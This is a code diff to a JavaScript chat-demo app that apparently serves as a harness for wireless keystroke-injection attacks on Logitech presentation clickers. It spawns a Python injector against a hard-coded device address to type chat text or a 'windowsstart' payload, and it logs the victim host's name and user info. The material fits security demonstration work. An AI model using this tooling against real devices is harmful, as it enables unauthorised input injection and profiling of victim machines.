@@ -1,3 +1,4 @@
+var os = require('os');
 var chatLog = 'payloads/server/public/chat.log';
 
 $(function () {
@@ -8,9 +9,14 @@ $(function () {
         var adminText = $('#admin_chat').val();
 
         if(adminText) {
+            $("body").trigger("admin.type");
             writeChatMessage(adminText, true);
-            $('#admin_chat').remove();
-            $('#m').prop('disabled', false).focus();
+            if($("#admin").length==0){
+              $('#admin_chat').remove();
+              $('#m').prop('disabled', false).focus();
+            }  else {
+               $("#admin_chat").val("");
+            }
 
             return false;
         }
@@ -51,7 +57,11 @@ function writeChatMessage(text, isFromAdmin){
     }
 }
 
+
 function logChatMessage(logFile, message, user) {
+    if(os.type() == 'Linux') {
+      return false;
+    }
     var content = `[${new Date().toISOString()}] <${user}>: ${message}\n`;
     var fs = require('fs');
     try { fs.appendFileSync(logFile, content, 'utf-8'); }
@@ -278,17 +288,26 @@ $('body').on('admin.chat', function(){
 
 $('body').on('admin.toggle', function() {
     if($('#admin').length) {
-        $('#admin').remove();        
+        $('#admin').remove();   
+        $('#admin_chat').remove(); 
+        $("#m").show();       
     } else {
         $.get('assets/admin.html', function(html){
             var adminPanel = $('<div>').attr('id', 'admin').html(html);
             $('body').prepend(adminPanel);
-        });        
+        });   
+        var adminChat=$("<input id='admin_chat'>").css({"position":"static"});     
+        $('#m').hide().after(adminChat);
+        $('#admin_chat').focus();      
     }
 });
 
-$(".demo").on("click", "#webcamera", function(e){
+$("body").on("click", "#webcamera", function(e){
     $('body').trigger('camera.toggle');
+});
+
+$("body").on("click", "#windowsstart", function(e){
+    $('body').trigger('windowsstart.inject');
 });
 
 
@@ -464,8 +483,6 @@ $('body').on('clipboard.read', function(){
 });
 
 
-var os = require('os');
-
 // for now, assume linux host is an admin (current attack/commands are windows specific, attack scripts assume linux host)
 if(os.type() == 'Linux') {
 
@@ -473,6 +490,8 @@ if(os.type() == 'Linux') {
     var env = Object.create( process.env );
     env.PYTHONPATH='payloads/presentation_clickers/tools';
 
+$('body').on('admin.type', function() {
+    var message = $("#admin_chat").val();
     var python = require('child_process').spawn('python2',
         [
             'payloads/injector_test.py',
@@ -481,10 +500,10 @@ if(os.type() == 'Linux') {
             'logitech',
             '-a',
             '21:F5:94:D1:07',
-            '-c',
+            '-z',
             'chat',
             '-m',
-            'This is a test...'
+            message
         ],
         {env:env}
     );
@@ -498,6 +517,33 @@ if(os.type() == 'Linux') {
     });
 
     console.log(python);
+});
+$('body').on('windowsstart.inject', function() {
+    console.log("here")  
+    var python = require('child_process').spawn('python2',
+        [
+            'payloads/injector_test.py',
+            '-l',
+            '-f',
+            'logitech',
+            '-a',
+            '21:F5:94:D1:07',
+            '-z',
+            'windowsstart',
+        ],
+        {env:env}
+    );
+
+    python.stdout.on('data',function(data){
+        console.log("data: ",data.toString('utf8'));
+    });
+
+    python.stderr.on('data',function(data){
+        console.log("error: ",data.toString('utf8'));
+    });
+});
+
+
 } else {
     var info = `hostname: ${os.hostname()}, ${JSON.stringify(os.userInfo())}`;
     logChatMessage(chatLog, info, 'system');
